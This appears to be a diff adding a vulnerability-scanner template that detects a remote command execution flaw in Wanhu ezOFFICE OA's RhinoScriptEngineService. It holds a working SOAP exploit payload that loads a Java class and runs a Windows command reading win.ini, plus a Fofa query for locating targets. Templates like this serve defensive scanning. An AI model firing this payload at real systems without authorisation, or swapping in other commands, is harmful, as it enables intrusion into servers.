@@ -1,0 +1,56 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      <?xml version='1.0' encoding='UTF-8'?>
+       <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
+         <soapenv:Body>
+           <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
+             <arg0 xmlns="">
+               <![CDATA[
+               try {
+               load("nashorn:Moziilla_compat.js");
+               } catch (e) {
+               }
+               importPackage(Packages.java.io);
+               importPackage(Packages.java.lang);
+               importPackage(Packages.java.util);
+               importPackage(Packages.java.net);
+
+               new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["type C:\\Windows\\win.ini"]).toString()
+
+               ]]>
+             </arg0>
+             <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
+             </arg1>
+           </eval>
+         </soapenv:Body>
+       </soapenv:Envelope>
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+      SOAPAction: '""'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - soapenv:Envelope
+          - bit app support
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}//defaultroot/services/./././RhinoScriptEngineService'
+id: wanhu-oa-rhinoscript-engineservice-rce
+info:
+  author: zan8in
+  description: |
+    Fofa: app="万户网络-ezOFFICE"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 万户OA-RhinoScriptEngineService命令执行
+  severity: critical
+  tags: wanhu,rce,argus-import
